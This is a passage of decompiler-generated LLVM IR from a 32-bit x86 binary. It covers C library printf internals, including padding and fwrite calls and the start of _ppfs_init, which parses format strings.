  %v1_8051179 = icmp eq i1 %v5_8051174, false
  br i1 %v1_8051179, label %dec_label_pc_80511a2, label %dec_label_pc_805117b

dec_label_pc_805117b:                             ; preds = %dec_label_pc_8051174
  %v1_805117b = add i32 %v0_805117b, 8
  %v2_805117b = inttoptr i32 %v1_805117b to i32*
  %v3_805117b = load i32, i32* %v2_805117b, align 4
  store i32 %v3_805117b, i32* @ecx, align 4
  store i32 32, i32* @edx, align 4
  %v1_8051184 = add i32 %v0_805117b, 368
  %v2_8051184 = inttoptr i32 %v1_8051184 to i32*
  %v3_8051184 = load i32, i32* %v2_8051184, align 4
  store i32 %v3_8051184, i32* @eax, align 4
  %v0_805118b = call i32 @_charpad()
  store i32 %v0_805118b, i32* %eax.global-to-local, align 4
  %v1_8051190 = load i32, i32* @esp, align 4
  %v2_8051190 = add i32 %v1_8051190, 8
  %v3_8051190 = inttoptr i32 %v2_8051190 to i32*
  %v4_8051190 = load i32, i32* %v3_8051190, align 4
  %v5_8051190 = sub i32 %v0_805118b, %v4_8051190
  %v15_8051190 = icmp eq i32 %v5_8051190, 0
  %v16_8051190 = icmp slt i32 %v5_8051190, 0
  store i1 %v16_8051190, i1* %sf.global-to-local, align 1
  %v1_8051194 = icmp eq i1 %v15_8051190, false
  br i1 %v1_8051194, label %dec_label_pc_805128f, label %dec_label_pc_805119a

dec_label_pc_805119a:                             ; preds = %dec_label_pc_805117b
  store i32 0, i32* %v3_8051190, align 4
  %v1_80511a2.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_80511a2

dec_label_pc_80511a2:                             ; preds = %dec_label_pc_8051174, %dec_label_pc_805119a
  %v1_80511a2 = phi i32 [ %v0_805117b, %dec_label_pc_8051174 ], [ %v1_80511a2.pre, %dec_label_pc_805119a ]
  %v0_80511a2 = load i32, i32* %eax.global-to-local, align 4
  %v2_80511a2 = add i32 %v1_80511a2, -4
  %v3_80511a2 = inttoptr i32 %v2_80511a2 to i32*
  store i32 %v0_80511a2, i32* %v3_80511a2, align 4
  %v0_80511a3 = load i32, i32* %eax.global-to-local, align 4
  %v2_80511a3 = add i32 %v1_80511a2, -8
  %v3_80511a3 = inttoptr i32 %v2_80511a3 to i32*
  store i32 %v0_80511a3, i32* %v3_80511a3, align 4
  %v1_80511a4 = add i32 %v1_80511a2, 368
  %v2_80511a4 = inttoptr i32 %v1_80511a4 to i32*
  %v3_80511a4 = load i32, i32* %v2_80511a4, align 4
  %v5_80511a4 = add i32 %v1_80511a2, -12
  %v6_80511a4 = inttoptr i32 %v5_80511a4 to i32*
  store i32 %v3_80511a4, i32* %v6_80511a4, align 4
  %v0_80511ab = load i32, i32* @ebp, align 4
  %v1_80511ab = add i32 %v0_80511ab, ptrtoint (i32* @global_var_80604a5.710 to i32)
  store i32 %v1_80511ab, i32* %eax.global-to-local, align 4
  %v2_80511b1 = add i32 %v1_80511a2, -16
  %v3_80511b1 = inttoptr i32 %v2_80511b1 to i32*
  store i32 %v1_80511ab, i32* %v3_80511b1, align 4
  %v0_80511b2 = load i32, i32* %stack_var_-364, align 4
  %v4_80511b2 = inttoptr i32 %v0_80511b2 to i8*
  %v5_80511b2 = call i32 @__GI_fputs_unlocked(i8* %v4_80511b2, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_80511b2, i32* %eax.global-to-local, align 4
  %v0_80511b7 = load i32, i32* @esp, align 4
  %v1_80511b7 = add i32 %v0_80511b7, 384
  %v2_80511b7 = inttoptr i32 %v1_80511b7 to i32*
  %v3_80511b7 = load i32, i32* %v2_80511b7, align 4
  store i32 %v3_80511b7, i32* @eax, align 4
  %v0_80511be = load i32, i32* @ebx, align 4
  store i32 %v0_80511be, i32* @ecx, align 4
  store i32 48, i32* @edx, align 4
  %v0_80511c5 = call i32 @_charpad()
  store i32 %v0_80511c5, i32* %eax.global-to-local, align 4
  %v0_80511ca = load i32, i32* @esp, align 4
  %v1_80511ca = add i32 %v0_80511ca, 16
  %v1_80511cd = load i32, i32* @ebx, align 4
  %v2_80511cd = sub i32 %v0_80511c5, %v1_80511cd
  %v12_80511cd = icmp eq i32 %v2_80511cd, 0
  %v13_80511cd = icmp slt i32 %v2_80511cd, 0
  store i1 %v13_80511cd, i1* %sf.global-to-local, align 1
  %v1_80511cf = icmp eq i1 %v12_80511cd, false
  br i1 %v1_80511cf, label %dec_label_pc_805128f, label %dec_label_pc_80511d5

dec_label_pc_80511d5:                             ; preds = %dec_label_pc_80511a2
  %v1_80511d5 = add i32 %v0_80511ca, 356
  %v2_80511d5 = inttoptr i32 %v1_80511d5 to i32*
  %v3_80511d5 = load i32, i32* %v2_80511d5, align 4
  %v4_80511d5 = icmp eq i32 %v3_80511d5, 0
  %v5_80511d5 = icmp slt i32 %v3_80511d5, 0
  store i1 %v5_80511d5, i1* %sf.global-to-local, align 1
  %v1_80511dd = icmp eq i1 %v4_80511d5, false
  br i1 %v1_80511dd, label %dec_label_pc_8051201, label %dec_label_pc_80511df

dec_label_pc_80511df:                             ; preds = %dec_label_pc_80511d5
  store i32 0, i32* %eax.global-to-local, align 4
  %v0_80511e1 = load i32, i32* @esi, align 4
  %v1_80511e1 = icmp eq i32 %v0_80511e1, 0
  %v2_80511e1 = icmp slt i32 %v0_80511e1, 0
  store i1 %v2_80511e1, i1* %sf.global-to-local, align 1
  br i1 %v1_80511e1, label %dec_label_pc_80511f7, label %dec_label_pc_80511e5

dec_label_pc_80511e5:                             ; preds = %dec_label_pc_80511df
  %v2_80511e5 = add i32 %v0_80511ca, 12
  %v3_80511e5 = inttoptr i32 %v2_80511e5 to i32*
  store i32 0, i32* %v3_80511e5, align 4
  %v1_80511e6 = add i32 %v0_80511ca, 384
  %v2_80511e6 = inttoptr i32 %v1_80511e6 to i32*
  %v3_80511e6 = load i32, i32* %v2_80511e6, align 4
  %v5_80511e6 = add i32 %v0_80511ca, 8
  %v6_80511e6 = inttoptr i32 %v5_80511e6 to i32*
  store i32 %v3_80511e6, i32* %v6_80511e6, align 4
  %v0_80511ed = load i32, i32* @esi, align 4
  %v2_80511ed = add i32 %v0_80511ca, 4
  %v3_80511ed = inttoptr i32 %v2_80511ed to i32*
  store i32 %v0_80511ed, i32* %v3_80511ed, align 4
  %v0_80511ee = load i32, i32* @edi, align 4
  %v3_80511ee = inttoptr i32 %v0_80511ca to i32*
  store i32 %v0_80511ee, i32* %v3_80511ee, align 4
  %v0_80511ef = load i32, i32* %stack_var_-364, align 4
  %v4_80511ef = call i32 @__stdio_fwrite(i32 %v0_80511ef, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_80511ef, i32* %eax.global-to-local, align 4
  %v0_80511f4 = load i32, i32* @esp, align 4
  %v1_80511f4 = add i32 %v0_80511f4, 16
  %v7_80511f4 = icmp slt i32 %v1_80511f4, 0
  store i1 %v7_80511f4, i1* %sf.global-to-local, align 1
  %v1_80511f7.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_80511f7

dec_label_pc_80511f7:                             ; preds = %dec_label_pc_80511df, %dec_label_pc_80511e5
  %v0_805126147 = phi i32 [ %v1_80511ca, %dec_label_pc_80511df ], [ %v1_80511f4, %dec_label_pc_80511e5 ]
  %v1_80511f7 = phi i32 [ 0, %dec_label_pc_80511df ], [ %v1_80511f7.pre, %dec_label_pc_80511e5 ]
  %v0_80511f7 = phi i32 [ 0, %dec_label_pc_80511df ], [ %v4_80511ef, %dec_label_pc_80511e5 ]
  %v2_80511f7 = sub i32 %v0_80511f7, %v1_80511f7
  %v12_80511f7 = icmp eq i32 %v2_80511f7, 0
  %v13_80511f7 = icmp slt i32 %v2_80511f7, 0
  store i1 %v13_80511f7, i1* %sf.global-to-local, align 1
  %v1_80511f9 = icmp eq i1 %v12_80511f7, false
  br i1 %v1_80511f9, label %dec_label_pc_805128f, label %dec_label_pc_8051261

dec_label_pc_8051201:                             ; preds = %dec_label_pc_80511d5
  %v1_8051201 = add i32 %v0_80511ca, 348
  %v2_8051201 = inttoptr i32 %v1_8051201 to i32*
  store i32 0, i32* %v2_8051201, align 4
  %v0_805125d9 = load i32, i32* @esi, align 4
  %v1_805125d10 = icmp eq i32 %v0_805125d9, 0
  %v2_805125d11 = icmp slt i32 %v0_805125d9, 0
  store i1 %v2_805125d11, i1* %sf.global-to-local, align 1
  %v1_805125f17 = icmp eq i1 %v1_805125d10, false
  %v0_805120e.pre = load i32, i32* @esp, align 4
  br i1 %v1_805125f17, label %dec_label_pc_805120e, label %dec_label_pc_8051261

dec_label_pc_805120e:                             ; preds = %dec_label_pc_8051201, %dec_label_pc_805125b
  %v0_8051215 = phi i32 [ %v2_805125b, %dec_label_pc_805125b ], [ %v0_805125d9, %dec_label_pc_8051201 ]
  %v1_8051220 = phi i32 [ %v0_805120e42, %dec_label_pc_805125b ], [ %v0_805120e.pre, %dec_label_pc_8051201 ]
  %v1_805120e = add i32 %v1_8051220, 332
  store i32 %v1_805120e, i32* %edx.global-to-local, align 4
  %v1_8051215 = add i32 %v0_8051215, -128
  %v2_8051215 = icmp ult i32 %v0_8051215, 128
  %v6_8051215 = icmp eq i32 %v1_8051215, 0
  %v7_8051215 = icmp slt i32 %v1_8051215, 0
  store i1 %v7_8051215, i1* %sf.global-to-local, align 1
  store i32 128, i32* %eax.global-to-local, align 4
  %v2_8051220 = add i32 %v1_8051220, -4
  %v3_8051220 = inttoptr i32 %v2_8051220 to i32*
  store i32 %v1_805120e, i32* %v3_8051220, align 4
  %v2_8051221 = or i1 %v2_8051215, %v6_8051215
  %v3_8051221 = load i32, i32* %eax.global-to-local, align 4
  %v4_8051221 = load i32, i32* @esi, align 4
  %v5_8051221 = select i1 %v2_8051221, i32 %v4_8051221, i32 %v3_8051221
  %v2_8051224 = add i32 %v1_8051220, -8
  %v3_8051224 = inttoptr i32 %v2_8051224 to i32*
  store i32 %v5_8051221, i32* %v3_8051224, align 4
  %v1_8051225 = add i32 %v1_8051220, 340
  store i32 %v1_8051225, i32* %eax.global-to-local, align 4
  %v2_805122c = add i32 %v1_8051220, -12
  %v3_805122c = inttoptr i32 %v2_805122c to i32*
  store i32 %v1_8051225, i32* %v3_805122c, align 4
  %v1_805122d = add i32 %v1_8051220, 204
  store i32 %v1_805122d, i32* @edi, align 4
  %v2_8051234 = add i32 %v1_8051220, -16
  %v3_8051234 = inttoptr i32 %v2_8051234 to i32*
  store i32 %v1_805122d, i32* %v3_8051234, align 4
  %v0_8051235 = call i32 @__GI_wcsrtombs()
  %v0_805123a = load i32, i32* @esp, align 4
  %v1_805123a = add i32 %v0_805123a, 16
  store i32 %v0_8051235, i32* @ebx, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v1_8051241 = icmp eq i32 %v0_8051235, 0
  %v2_8051241 = icmp slt i32 %v0_8051235, 0
  store i1 %v2_8051241, i1* %sf.global-to-local, align 1
  br i1 %v1_8051241, label %dec_label_pc_8051257, label %dec_label_pc_8051245

dec_label_pc_8051245:                             ; preds = %dec_label_pc_805120e
  %v0_8051245 = load i32, i32* @ebp, align 4
  %v2_8051245 = add i32 %v0_805123a, 12
  %v3_8051245 = inttoptr i32 %v2_8051245 to i32*
  store i32 %v0_8051245, i32* %v3_8051245, align 4
  %v1_8051246 = add i32 %v0_805123a, 384
  %v2_8051246 = inttoptr i32 %v1_8051246 to i32*
  %v3_8051246 = load i32, i32* %v2_8051246, align 4
  %v5_8051246 = add i32 %v0_805123a, 8
  %v6_8051246 = inttoptr i32 %v5_8051246 to i32*
  store i32 %v3_8051246, i32* %v6_8051246, align 4
  %v2_805124d = add i32 %v0_805123a, 4
  %v3_805124d = inttoptr i32 %v2_805124d to i32*
  store i32 %v0_8051235, i32* %v3_805124d, align 4
  %v0_805124e = load i32, i32* @edi, align 4
  %v3_805124e = inttoptr i32 %v0_805123a to i32*
  store i32 %v0_805124e, i32* %v3_805124e, align 4
  %v0_805124f = load i32, i32* %stack_var_-364, align 4
  %v4_805124f = call i32 @__stdio_fwrite(i32 %v0_805124f, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_805124f, i32* %eax.global-to-local, align 4
  %v0_8051254 = load i32, i32* @esp, align 4
  %v1_8051254 = add i32 %v0_8051254, 16
  %v7_8051254 = icmp slt i32 %v1_8051254, 0
  store i1 %v7_8051254, i1* %sf.global-to-local, align 1
  br label %dec_label_pc_8051257

dec_label_pc_8051257:                             ; preds = %dec_label_pc_805120e, %dec_label_pc_8051245
  %v1_805125b = phi i32 [ 0, %dec_label_pc_805120e ], [ %v4_805124f, %dec_label_pc_8051245 ]
  %v0_805120e42 = phi i32 [ %v1_805123a, %dec_label_pc_805120e ], [ %v1_8051254, %dec_label_pc_8051245 ]
  %v2_8051257 = sub i32 %v1_805125b, %v0_8051235
  %v12_8051257 = icmp eq i32 %v2_8051257, 0
  %v13_8051257 = icmp slt i32 %v2_8051257, 0
  store i1 %v13_8051257, i1* %sf.global-to-local, align 1
  %v1_8051259 = icmp eq i1 %v12_8051257, false
  br i1 %v1_8051259, label %dec_label_pc_805128f, label %dec_label_pc_805125b

dec_label_pc_805125b:                             ; preds = %dec_label_pc_8051257
  %v0_805125b = load i32, i32* @esi, align 4
  %v2_805125b = sub i32 %v0_805125b, %v1_805125b
  %v12_805125b = icmp eq i32 %v2_805125b, 0
  %v13_805125b = icmp slt i32 %v2_805125b, 0
  store i32 %v2_805125b, i32* @esi, align 4
  store i1 %v13_805125b, i1* %sf.global-to-local, align 1
  %v1_805125f = icmp eq i1 %v12_805125b, false
  br i1 %v1_805125f, label %dec_label_pc_805120e, label %dec_label_pc_8051261

dec_label_pc_8051261:                             ; preds = %dec_label_pc_805125b, %dec_label_pc_8051201, %dec_label_pc_80511f7
  %v0_8051261 = phi i32 [ %v0_805126147, %dec_label_pc_80511f7 ], [ %v0_805120e.pre, %dec_label_pc_8051201 ], [ %v0_805120e42, %dec_label_pc_805125b ]
  %v1_8051261 = add i32 %v0_8051261, 8
  %v2_8051261 = inttoptr i32 %v1_8051261 to i32*
  %v3_8051261 = load i32, i32* %v2_8051261, align 4
  store i32 %v3_8051261, i32* @ecx, align 4
  store i32 32, i32* @edx, align 4
  %v1_805126a = add i32 %v0_8051261, 368
  %v2_805126a = inttoptr i32 %v1_805126a to i32*
  %v3_805126a = load i32, i32* %v2_805126a, align 4
  store i32 %v3_805126a, i32* @eax, align 4
  %v0_8051271 = call i32 @_charpad()
  store i32 %v0_8051271, i32* %eax.global-to-local, align 4
  %v1_8051276 = load i32, i32* @esp, align 4
  %v2_8051276 = add i32 %v1_8051276, 8
  %v3_8051276 = inttoptr i32 %v2_8051276 to i32*
  %v4_8051276 = load i32, i32* %v3_8051276, align 4
  %v5_8051276 = sub i32 %v0_8051271, %v4_8051276
  %v15_8051276 = icmp eq i32 %v5_8051276, 0
  %v16_8051276 = icmp slt i32 %v5_8051276, 0
  store i1 %v16_8051276, i1* %sf.global-to-local, align 1
  %v1_805127a = icmp eq i1 %v15_8051276, false
  br i1 %v1_805127a, label %dec_label_pc_805128f, label %dec_label_pc_805127c

dec_label_pc_805127c:                             ; preds = %dec_label_pc_8051261, %dec_label_pc_8050fe9, %dec_label_pc_8050e14
  %v0_805127c = phi i32 [ %v1_8051276, %dec_label_pc_8051261 ], [ %v0_805127c.pre, %dec_label_pc_8050fe9 ], [ %v1_8050e32, %dec_label_pc_8050e14 ]
  %v1_805127c = add i32 %v0_805127c, 16
  %v2_805127c = inttoptr i32 %v1_805127c to i32*
  %v3_805127c = load i32, i32* %v2_805127c, align 4
  store i32 %v3_805127c, i32* @ebx, align 4
  store i32 %v3_805127c, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8050d6c.backedge

dec_label_pc_8051287:                             ; preds = %dec_label_pc_8050daa
  %v1_8051287 = add i32 %v0_8051287, 2
  %v10_8051287 = icmp slt i32 %v1_8051287, 0
  store i1 %v10_8051287, i1* %sf.global-to-local, align 1
  store i32 %v1_8051287, i32* @ebx, align 4
  br label %dec_label_pc_8050d6c.backedge

dec_label_pc_805128f:                             ; preds = %dec_label_pc_8050d96, %dec_label_pc_8051261, %dec_label_pc_80511f7, %dec_label_pc_80511a2, %dec_label_pc_805117b, %dec_label_pc_80510eb, %dec_label_pc_805105e, %dec_label_pc_805101f, %dec_label_pc_8050fc0, %dec_label_pc_8051257
  %v0_805128f = phi i32 [ %v0_805120e42, %dec_label_pc_8051257 ], [ %v0_805128f.pre.pre, %dec_label_pc_8050d96 ], [ %v1_8051276, %dec_label_pc_8051261 ], [ %v0_805126147, %dec_label_pc_80511f7 ], [ %v1_80511ca, %dec_label_pc_80511a2 ], [ %v1_8051190, %dec_label_pc_805117b ], [ %v0_8050e0c.lcssa, %dec_label_pc_80510eb ], [ %v1_8051076, %dec_label_pc_805105e ], [ %v1_8051042, %dec_label_pc_805101f ], [ %v1_8050fde, %dec_label_pc_8050fc0 ]
  %v1_805128f = inttoptr i32 %v0_805128f to i32*
  store i32 -1, i32* %v1_805128f, align 4
  br label %dec_label_pc_8051296

dec_label_pc_8051296:                             ; preds = %dec_label_pc_8050da1, %dec_label_pc_8050d0f, %dec_label_pc_8050d2e, %dec_label_pc_805128f
  %v0_8051296 = load i32, i32* @esp, align 4
  %v1_8051296 = inttoptr i32 %v0_8051296 to i32*
  %v2_8051296 = load i32, i32* %v1_8051296, align 4
  store i32 %v2_8051296, i32* %eax.global-to-local, align 4
  %v1_8051299 = add i32 %v0_8051296, 348
  %v10_8051299 = icmp slt i32 %v1_8051299, 0
  store i1 %v10_8051299, i1* %sf.global-to-local, align 1
  ret i32 %v2_8051296

; uselistorder directives
  uselistorder i32 %v1_8051287, { 1, 2, 0 }
  uselistorder i32 %v3_805127c, { 2, 3, 0, 1 }
  uselistorder i32 %v0_8051261, { 1, 0 }
  uselistorder i32 %v2_805125b, { 1, 2, 3, 0 }
  uselistorder i32 %v0_805123a, { 4, 0, 1, 2, 3, 5 }
  uselistorder i32 %v1_8051215, { 1, 0 }
  uselistorder i32 %v0_805120e.pre, { 1, 0 }
  uselistorder i32 %v0_80511e1, { 1, 0 }
  uselistorder i32 %v3_80511d5, { 1, 0 }
  uselistorder i32 %v0_80511ca, { 0, 6, 1, 2, 3, 4, 5, 7 }
  uselistorder i32 %v1_80511a2, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_805117b, { 0, 2, 1, 3 }
  uselistorder i8 %v4_8051163, { 1, 0 }
  uselistorder i32 %v2_805114f, { 1, 0, 2, 3 }
  uselistorder i32 %v6_805113c, { 1, 0 }
  uselistorder i32 %v1_8051139, { 1, 0 }
  uselistorder i32 %v1_805112f, { 1, 0 }
  uselistorder i32 %v0_805112f, { 0, 2, 1, 3 }
  uselistorder i32 %v1_805110e, { 1, 0 }
  uselistorder i32 %v1_80510eb, { 1, 0 }
  uselistorder i32 %v1_80510a9, { 0, 1, 3, 2, 4 }
  uselistorder i32 %v2_80510c5, { 3, 2, 1, 0 }
  uselistorder i32 %v1_805108e, { 1, 0 }
  uselistorder i32 %v1_8051079, { 1, 0 }
  uselistorder i32 %v1_8051045, { 1, 0 }
  uselistorder i32 %v0_805101f, { 4, 3, 2, 1, 0, 5, 6 }
  uselistorder i32 %v0_8051005, { 5, 4, 3, 2, 1, 0, 6, 7 }
  uselistorder i32 %v1_8050ff1, { 1, 0 }
  uselistorder i32 %v1_8050fa7, { 1, 0 }
  uselistorder i32 %v4_8050f75, { 1, 0 }
  uselistorder i32 %v0_8050f6a, { 1, 0, 2, 3 }
  uselistorder i8 %v3_8050f65, { 1, 0 }
  uselistorder i32 %v0_8050f9e, { 1, 0, 2, 3 }
  uselistorder i8 %v3_8050f55, { 1, 0 }
  uselistorder i32 %v1_8050f4c, { 1, 0 }
  uselistorder i32 %v1_8050f40, { 1, 0 }
  uselistorder i32 %v3_8050f34, { 1, 2, 0, 3 }
  uselistorder i32 %v3_8050f2a, { 0, 1, 2, 3, 5, 4, 6 }
  uselistorder i32 %v1_8050f25, { 0, 1, 3, 2, 5, 4, 6 }
  uselistorder i32 %v2_8050f23, { 1, 0 }
  uselistorder i32 %v0_8050f75, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v0_8050f65, { 1, 2, 0 }
  uselistorder i32 %v3_8050efd, { 0, 1, 3, 2 }
  uselistorder i8 %v4_8050eeb, { 1, 0 }
  uselistorder i32 %v4_8050ee2, { 1, 0 }
  uselistorder i32 %v3_8050ee2, { 1, 0 }
  uselistorder i32 %v6_8050eda, { 0, 1, 2, 5, 3, 4 }
  uselistorder i32 %v0_8050eab, { 3, 2, 1, 0, 4, 5 }
  uselistorder i32 %v1_8050eaa, { 2, 1, 0 }
  uselistorder i32 %v1_8050e83, { 1, 0 }
  uselistorder i32 %v1_8050e77, { 1, 0 }
  uselistorder i32 %v1_8050e72, { 1, 0 }
  uselistorder i32 %v2_8050e6a, { 1, 0 }
  uselistorder i32 %tmp69, { 1, 0 }
  uselistorder i32 %v3_8050e54, { 1, 0, 2 }
  uselistorder i8 %v3_8050e43, { 1, 2, 0, 3 }
  uselistorder i32 %v1_8050e3a, { 1, 0 }
  uselistorder i32 %v3_8050e0c, { 8, 3, 4, 6, 7, 12, 13, 11, 10, 2, 16, 5, 0, 1, 9, 14, 15, 17, 18, 19 }
  uselistorder i32 %v0_8050e0c.lcssa, { 0, 8, 9, 7, 6, 10, 26, 25, 13, 14, 15, 16, 17, 18, 12, 11, 21, 20, 19, 24, 23, 22, 2, 3, 4, 5, 1 }
  uselistorder i32 %v2_8050e08, { 1, 0 }
  uselistorder i32 %v1_8050e08.pre, { 1, 0 }
  uselistorder i32 %v1_8050e07, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_8050e04, { 1, 0 }
  uselistorder i32 %v2_8050e0873, { 1, 0 }
  uselistorder i32 %v3_8050dee, { 1, 0 }
  uselistorder i8 %v4_8050daa, { 1, 0 }
  uselistorder i32 %v1_8050daa, { 1, 0, 3, 2 }
  uselistorder i8 %v2_8050da1, { 1, 0 }
  uselistorder i32 %v2_8050d76, { 0, 2, 1, 3, 4 }
  uselistorder i8 %v2_8050d72, { 1, 0 }
  uselistorder i8 %v2_8050d6c, { 0, 2, 1, 3 }
  uselistorder i32 %v0_8050d7a, { 0, 1, 3, 2 }
  uselistorder i32 %v0_8050d5c, { 1, 0, 2 }
  uselistorder i32* %stack_var_-16, { 1, 0 }
  uselistorder i32* %stack_var_-348, { 1, 0, 2 }
  uselistorder i32* %stack_var_-364, { 3, 2, 5, 0, 1, 7, 6, 4, 8, 9, 10, 11 }
  uselistorder i1* %sf.global-to-local, { 0, 1, 2, 7, 3, 4, 5, 6, 94, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 86, 87, 85, 88, 89, 90, 91, 92, 93 }
  uselistorder i32* %edx.global-to-local, { 0, 1, 2, 19, 3, 4, 7, 5, 6, 8, 9, 10, 12, 11, 13, 14, 20, 15, 16, 17, 21, 18, 22, 23, 24, 25 }
  uselistorder i32* %eax.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 14, 15, 13, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 0, 62, 63, 51, 52, 53, 54, 55, 57, 56, 58, 59, 60, 61 }
  uselistorder i32 348, { 1, 0 }
  uselistorder i32 ()* @_charpad, { 2, 1, 0, 3 }
  uselistorder i32 ()* @__GI_wcsrtombs, { 1, 0 }
  uselistorder i32 332, { 1, 0, 2, 3 }
  uselistorder i32 204, { 1, 2, 4, 5, 3, 0 }
  uselistorder i32 344, { 1, 2, 3, 4, 0, 5 }
  uselistorder i32 368, { 3, 1, 4, 0, 2 }
  uselistorder label %dec_label_pc_8051296, { 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_805128f, { 1, 9, 2, 3, 4, 5, 6, 7, 8, 0 }
  uselistorder label %dec_label_pc_8051257, { 1, 0 }
  uselistorder label %dec_label_pc_805120e, { 1, 0 }
  uselistorder label %dec_label_pc_80511f7, { 1, 0 }
  uselistorder label %dec_label_pc_80511a2, { 1, 0 }
  uselistorder label %dec_label_pc_8051174, { 1, 0 }
  uselistorder label %dec_label_pc_8051159, { 1, 0 }
  uselistorder label %dec_label_pc_8051143, { 1, 0 }
  uselistorder label %dec_label_pc_805112f, { 2, 0, 1 }
  uselistorder label %dec_label_pc_805112a, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_80510bc, { 1, 0 }
  uselistorder label %dec_label_pc_80510a2, { 1, 0 }
  uselistorder label %dec_label_pc_8050fc0, { 1, 0 }
  uselistorder label %dec_label_pc_8050f65, { 5, 1, 0, 2, 4, 3 }
  uselistorder label %dec_label_pc_8050f13, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_8050ec3, { 1, 0 }
  uselistorder label %dec_label_pc_8050eaa, { 1, 0 }
  uselistorder label %dec_label_pc_8050e96, { 1, 0 }
  uselistorder label %dec_label_pc_8050e91, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8050e72, { 1, 0 }
  uselistorder label %dec_label_pc_8050dfd, { 1, 0 }
  uselistorder label %dec_label_pc_8050df5, { 1, 0 }
  uselistorder label %dec_label_pc_8050da1, { 1, 0 }
  uselistorder label %dec_label_pc_8050d96, { 1, 0 }
  uselistorder label %dec_label_pc_8050d6c.backedge, { 2, 1, 0 }
}

define i32 @_ppfs_init(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp11 = ptrtoint i32* %arg1 to i32
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_80512a4 = load i32, i32* @esi, align 4
  %v0_80512a5 = load i32, i32* @ebx, align 4
  store i32 %v0_80512a5, i32* %stack_var_-8, align 4
  store i32 %tmp11, i32* @ebx, align 4
  store i32 %arg2, i32* @esi, align 4
  %v3_80512b9 = bitcast i32* %arg1 to i8*
  %v4_80512b9 = call i32 @__GI_memset(i8* %v3_80512b9, i32 0, i32 188)
  %v0_80512be = load i32, i32* @ebx, align 4
  %v1_80512be = add i32 %v0_80512be, 40
  store i32 %v1_80512be, i32* %eax.global-to-local, align 4
  store i32 9, i32* %edx.global-to-local, align 4
  %v1_80512c6 = add i32 %v0_80512be, 24
  %v2_80512c6 = inttoptr i32 %v1_80512c6 to i32*
  %v3_80512c6 = load i32, i32* %v2_80512c6, align 4
  %v4_80512c6 = add i32 %v3_80512c6, -1
  store i32 %v4_80512c6, i32* %v2_80512c6, align 4
  %v0_80512cc = load i32, i32* @esi, align 4
  %v1_80512cc = load i32, i32* @ebx, align 4
  %v2_80512cc = inttoptr i32 %v1_80512cc to i32*
  store i32 %v0_80512cc, i32* %v2_80512cc, align 4
  %v0_80512ce.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80512ce

dec_label_pc_80512ce:                             ; preds = %dec_label_pc_80512ce, %entry
  %v0_80512ce = phi i32 [ %v1_80512d4, %dec_label_pc_80512ce ], [ %v0_80512ce.pre, %entry ]
  %v1_80512ce = inttoptr i32 %v0_80512ce to i32*
  store i32 8, i32* %v1_80512ce, align 4
  %v0_80512d4 = load i32, i32* %eax.global-to-local, align 4
  %v1_80512d4 = add i32 %v0_80512d4, 4
  store i32 %v1_80512d4, i32* %eax.global-to-local, align 4
  %v0_80512d7 = load i32, i32* %edx.global-to-local, align 4
  %v1_80512d7 = add i32 %v0_80512d7, -1
  %v8_80512d7 = icmp eq i32 %v1_80512d7, 0
  store i32 %v1_80512d7, i32* %edx.global-to-local, align 4
  %v1_80512d8 = icmp eq i1 %v8_80512d7, false
  br i1 %v1_80512d8, label %dec_label_pc_80512ce, label %dec_label_pc_80512da

dec_label_pc_80512da:                             ; preds = %dec_label_pc_80512ce
  %v0_80512da = load i32, i32* @esi, align 4
  store i32 %v0_80512da, i32* %eax.global-to-local, align 4
  %v1_805130520 = inttoptr i32 %v0_80512da to i8*
  %v2_805130521 = load i8, i8* %v1_805130520, align 1
  %v3_805130522 = zext i8 %v2_805130521 to i32
  %v5_805130523 = and i32 %v1_80512d7, -256
  %v6_805130524 = or i32 %v3_805130522, %v5_805130523
  store i32 %v6_805130524, i32* %edx.global-to-local, align 4
  %v4_805130725 = icmp eq i8 %v2_805130521, 0
  %v1_805130927 = icmp eq i1 %v4_805130725, false
  br i1 %v1_805130927, label %dec_label_pc_80512e3, label %dec_label_pc_805130b

dec_label_pc_80512e3:                             ; preds = %dec_label_pc_80512da, %dec_label_pc_8051305.backedge
  %v6_805130530 = phi i32 [ %v6_8051305, %dec_label_pc_8051305.backedge ], [ %v6_805130524, %dec_label_pc_80512da ]
  %v2_805130529 = phi i8 [ %v2_8051305, %dec_label_pc_8051305.backedge ], [ %v2_805130521, %dec_label_pc_80512da ]
  %v0_80512e828 = phi i32 [ %v0_80512e8.be, %dec_label_pc_8051305.backedge ], [ %v0_80512da, %dec_label_pc_80512da ]
  %v10_80512e3 = icmp eq i8 %v2_805130529, 37
  %v1_80512e6 = icmp eq i1 %v10_80512e3, false
